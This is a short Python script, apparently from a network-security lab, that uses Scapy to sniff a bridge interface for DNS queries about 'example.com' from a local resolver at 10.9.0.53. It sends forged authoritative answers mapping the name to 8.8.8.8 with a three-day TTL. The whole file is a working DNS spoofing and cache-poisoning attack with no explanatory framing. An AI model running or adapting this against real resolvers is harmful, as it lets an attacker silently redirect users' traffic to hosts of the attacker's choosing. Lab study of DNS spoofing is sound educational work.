#!/bin/env python3

from scapy.all import *
import sys

NS_NAME = "example.com"

def spoof_dns(pkt):
  if (DNS in pkt and 'example.com' in pkt[DNS].qd.qname.decode('utf-8')):
    print(pkt.sprintf("{DNS:%IP.src% --> %IP.dst%:%DNS.id%}"))

    ip  = IP (dst = pkt[IP].src,     src = pkt[IP].dst)
    udp = UDP(dport = pkt[IP].sport, sport = 53)

    Anssec = DNSRR( rrname = pkt[DNS].qd.qname, 
                    type   = 'A',         
                    rdata  = '8.8.8.8', 
                    ttl    = 259200)

    dns = DNS( id = pkt[DNS].id, aa=1, qr=1, 
               qdcount=1, qd = pkt[DNS].qd,                   
               ancount=1, an = Anssec )

    spoofpkt = ip/udp/dns
    send(spoofpkt)

f = 'udp and (src host 10.9.0.53 and dst port 53)'
pkt=sniff(iface='br-04dcb0b4200e', filter=f, prn=spoof_dns)